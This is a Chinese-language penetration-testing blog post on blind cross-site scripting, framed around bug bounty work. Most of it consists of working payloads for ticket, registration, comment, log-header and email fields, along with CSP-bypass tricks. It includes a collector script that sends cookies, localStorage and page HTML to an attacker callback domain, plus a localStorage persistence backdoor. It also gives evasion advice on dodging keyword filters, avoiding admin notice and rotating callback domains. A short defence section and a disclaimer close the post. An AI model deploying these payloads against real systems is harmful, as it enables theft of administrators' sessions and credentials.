---
title: 盲XSS实战
date: 2025-04-15 08:00:00
tags:
  - Web安全
  - 渗透测试
description: 盲XSS实战——渗透测试实战笔记，含完整攻击链路与防御方案。
categories: 渗透测试
cover: /img/blind-xss-cover.png
---

## 一、什么是盲XSS

盲XSS（Blind Cross-Site Scripting）与传统反射型/DOM型XSS最大的区别在于：**你永远不会在前端页面上看到弹窗**。Payload被提交后存储在目标系统的数据库中，当管理员在后台审核、客服在工单系统查看、或者日志平台渲染用户输入时才会触发。攻击者依赖外带（out-of-band）回调来确认漏洞存在并收集数据。

```
[攻击者] --提交Payload--> [留言板/工单/注册表单] --> [数据库存储]
                                |                          |
                   [管理员后台] <--+      [日志系统/客服面板] <--+
                        |                          |
                        +--> [XSS Hunter 回调] <---+
                                  |
                          截图/Cookie/DOM/页面源码
```

盲XSS的典型生命周期：注入 → 静默等待 → 管理员触发 → 数据回传 → 编写报告。

---

## 二、搭建XSS Hunter

公开的XSS Hunter服务（如 `xsshunter.com`）存在域名已被WAF标记、数据合规风险、可定制性差等问题，因此建议自建。

```bash
git clone https://github.com/mandatoryprogrammer/xsshunter.git
cd xsshunter
# 修改 api.yaml: 控制面板域名、回调域名（如 xss.yourdomain.com）、JS文件名随机化
docker-compose up -d
```

| 配置项 | 说明 | 建议 |
|--------|------|------|
| `CALLBACK_DOMAIN` | Payload回调域名 | 独立域名，不与主站关联 |
| `JS_FILENAME` | 注入用JS文件名 | 随机化（如 `a8f3b2.js`），规避关键词检测 |
| `COOKIE_SECRET` | 会话加密密钥 | 强随机字符串 |
| `HTTPS` | 是否启用TLS | 必须启用，否则HTTPS页面会拦截混合内容 |

基础Payload模板 `<script src="//xss.yourdomain.com/a8f3b2.js"></script>`，自动收集 `document.cookie`、`document.domain`、`document.URL`、`body.innerHTML`（截取前5000字符）、浏览器指纹及页面截图。

---

## 三、常见盲XSS注入点

### 3.1 工单/客服系统

SRC中盲XSS最高发场景。用户提交工单的任意字段都可能进入后台。

```javascript
// 工单标题
"工单标题"><img src=x onerror="$.getScript('//xss.yourdomain.com/a8f3b2.js')">

// 工单描述（富文本编辑器）
<a href="javascript:eval(atob('...'))">点击查看详情</a>

// 附件文件名
<img src=x onerror=eval(atob('...'))>.pdf

// 个人信息字段（姓名/电话/地址）
<script src="//xss.yourdomain.com/a8f3b2.js"></script>
```

> 某电商SRC：在退货工单"收货地址"字段注入Payload，三天后 `admin.internal.com` 触发回调，获取管理员Cookie，评级高危。

### 3.2 用户注册/个人信息

用户名字段常被忽略，但在管理员查看用户列表时触发。注意字段长度限制（通常20-30字符），需准备短Payload：

```
用户名: <svg/onload=import('//a.cc')>              // 25字符
昵称:   <img src=x onerror=import('//a.cc')>        // 34字符
签名档: <body onload=import('//xss.yourdomain.com/j.js')>
```

### 3.3 评论/留言板审核后台

经典盲XSS场景，评论提交后需管理员在后台审核时触发。短Payload集合：

```javascript
<svg onload=import('//a.cc')>          // 25字符
<img src=x onerror=import('//a.cc')>  // 34字符
<body onload=import('//a.cc')>         // 29字符
```

建议购买短域名（如 `a.cc`）做CNAME跳转到XSS Hunter服务器，绕过长度限制。

### 3.4 日志系统

ELK、Splunk等日志平台渲染用户输入时往往不做输出编码。

| 注入字段 | 示例 |
|----------|------|
| User-Agent | `curl -H 'User-Agent: <script src="//xss.yourdomain.com/j.js"></script>' https://target.com` |
| 搜索关键词 | `https://target.com/search?q=<img/src=x onerror=import(...)>` |
| HTTP Referer | 从伪造页面跳转，Referer中携带Payload |
| 邮件主题 | 发送邮件到客服，主题行嵌入XSS |

### 3.5 邮件客户端XSS

基于Web的邮件系统（尤其是自建邮件系统）在渲染HTML邮件时可能触发XSS：

```html
From: attacker@evil.com
Subject: 关于您的订单 #<img src=x onerror="$.getScript('//xss.yourdomain.com/j.js')">
Content-Type: text/html

<div style="display:none">
  <img src=x onerror="import('//xss.yourdomain.com/j.js')">
</div>
<p>尊敬的客服人员，请查看附件中的订单详情。</p>
```

Gmail和Outlook企业版对XSS有较强过滤，但自建邮件系统和部分国内企业邮箱保护较弱。

---

## 四、高级Payload技术

### 4.1 绕过CSP

```javascript
// 利用JSONP端点
<script src="https://target.com/api/jsonp?callback=eval(atob('...'))"></script>

// Angular/Vue沙箱逃逸（针对特定版本）
{{constructor.constructor('import("//xss.yourdomain.com/j.js")')()}}
```

### 4.2 DOM信息收集

触发时应收集数据以最大化影响：

```javascript
var c = {
    cookie: document.cookie,
    url: document.URL,
    domain: document.domain,
    title: document.title,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    innerHTML: document.documentElement.innerHTML.substring(0, 10000),
    ua: navigator.userAgent,
    language: navigator.language,
    screen: screen.width + 'x' + screen.height,
    timestamp: new Date().toISOString()
};
new Image().src = '//xss.yourdomain.com/collect?d=' + btoa(JSON.stringify(c));
```

### 4.3 持久化后门

```javascript
// localStorage持久化
localStorage.setItem('__debug', 'import("//xss.yourdomain.com/backdoor.js")');

// Service Worker持久化（需同源）
navigator.serviceWorker.register('/sw.js');
```

---

## 五、等待的艺术：延迟触发与耐心追踪

盲XSS最反直觉的一点是**时间跨度**。根据实战经验，触发时间分布大致如下：

- **1小时内触发**：约15%（实时监控系统、在线客服）
- **1-24小时触发**：约35%（日常审核）
- **1-7天触发**：约35%（周期性审核、工单流转）
- **7天以上触发**：约10%（低频后台、月度报表）
- **从未触发**：约5%

**实战策略：**
1. 每天早晚各检查一次回调面板，不要频繁刷新。
2. 详细记录每次注入的位置、Payload、时间、唯一标识（例如参数 `?target=xxx&vector=register&id=20250415_001`）。
3. 同一注入点避免重复注入，防止引起管理员警觉。
4. XSS Hunter面板的页面截图功能用于确认触发页面是否为管理后台，DOM快照用于分析后台结构。

---

## 六、SRC盲XSS实战案例

### 案例一：社交平台私信盲XSS

在私信的富文本编辑器中嵌入 `<svg onload=import('//xss.mydomain.com/j.js')>`，编辑器仅过滤 `<script>` 和 `onerror`/`onclick`，遗漏了 `<svg>` 的 `onload`。等待4天后管理员审核举报时触发，回调显示管理员浏览器可访问内部管理API。高危，奖金2500元。

### 案例二：电商平台订单备注盲XSS

下单时在订单备注填入 `"><img src=x onerror="fetch('//xss.mydomain.com/c?c='+document.cookie+'&u='+document.URL)">`。第2天和第7天分别收到卖家订单管理页和平台客服工单系统的回调，客服回调泄露了会话Token。两个系统均受影响，评级严重，奖金6000元。

### 案例三：云服务商企业认证盲XSS

注册企业账号时在公司名称字段填入 `<svg/onload=import('//c.dd')>`（31字符，配合短域名）。13天后多个IP触发Payload，其中一个触发源页面HTML包含 `role="admin"` 和内部API密钥。事后发现审核人员浏览器加载了SSO统一认证页面，Cookie泄露可横向越权至多个子域。严重漏洞。

**共同教训：** 企业认证字段常被忽视；审核后台往往有SSO，一次XSS能影响多个子域；非标准HTML标签（如 `<svg>`、`<math>`）和事件处理器（如 `onload`、`onfocus`）比 `<script>` 更容易绕过过滤器。

---

## 七、盲XSS流程与常见陷阱

### 7.1 工作流程

```
识别数据持久化入口 -> 测试输入过滤规则 -> 注入Payload -> 记录注入详情 -> 等待回调
                                                                              |
                                                    收到回调 -> 分析数据 -> 编写报告 -> 提交SRC
                                                    超时(>30天) -> 检查拦截 -> 换注入点重试
```

### 7.2 常见陷阱

| 陷阱 | 问题 | 对策 |
|------|------|------|
| WAF/CDN过滤 | CDN缓存导致管理员不触发；WAF拦截外带请求 | 注入后验证Payload完整性；多准备几个备用回调域名 |
| 字符编码 | 后台做HTML实体编码但用innerHTML渲染 | 测试 `<` 和 `"` 是否被转义，寻找未编码的渲染上下文 |
| 回调域名屏蔽 | 企业DNS或安全软件屏蔽未知域名 | 使用小众TLD（`.site`、`.space`），准备多个备用域名 |
| SameSite Cookie | Cookie设为Lax/Strict导致CSRF失败 | 优先收集Authorization Header和localStorage中的JWT |
| 沙箱隔离 | 管理后台用iframe隔离用户内容 | 检测 `window.top !== window.self`，若隔离则仅做信息收集 |

**未收到回调时的排查清单：**
1. Payload域名是否能正常解析？HTTPS证书有效吗？
2. 混内容拦截：HTTP Payload在HTTPS页面会被浏览器阻止。
3. XSS Hunter服务/Docker容器是否正常运行？
4. Payload是否被后端 `strip_tags()` 之类的函数二次过滤？
5. 目标管理员浏览器是否有NoScript等扩展？

---

## 八、防御建议

1. **输出编码**：所有用户可控数据输出到HTML时进行上下文相关编码（HTML实体/JS/URL编码）。
2. **CSP**：配置严格 `Content-Security-Policy`，禁用 `unsafe-inline` 和 `unsafe-eval`。
3. **输入过滤**：服务端白名单校验，拒绝或净化HTML标签。
4. **沙箱隔离**：用户生成内容渲染在独立Origin下，使用 `sandbox` iframe。
5. **Trusted Types**：启用浏览器级别XSS防护。
6. **定期审计**：对后台管理系统进行渗透测试和代码审计。

---

## 九、免责声明

> **声明：** 本文所述技术仅供安全研究和授权范围内的渗透测试使用。未经系统所有者明确书面授权而对任何系统进行XSS测试均属违法行为。作者不对任何滥用本文内容导致的后果承担责任。在SRC平台测试时，请严格遵守平台规则，仅在授权范围内测试，不得越权访问或篡改数据，发现漏洞后应立即通过官方渠道报告，不得公开披露。

盲XSS测试注意事项：不使用破坏性Payload；回调获取的认证信息应在测试后立即失效并通知厂商；对截图等敏感信息做好脱敏。

---

## 参考资料

- [PortSwigger - Blind XSS](https://portswigger.net/web-security/cross-site-scripting/blind)
- [OWASP - Blind XSS](https://owasp.org/www-community/attacks/Blind_XSS)
- [XSS Hunter 开源项目](https://github.com/mandatoryprogrammer/xsshunter)
- [XSS Payloads 参考](https://github.com/payloadbox/xss-payload-list)
- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)
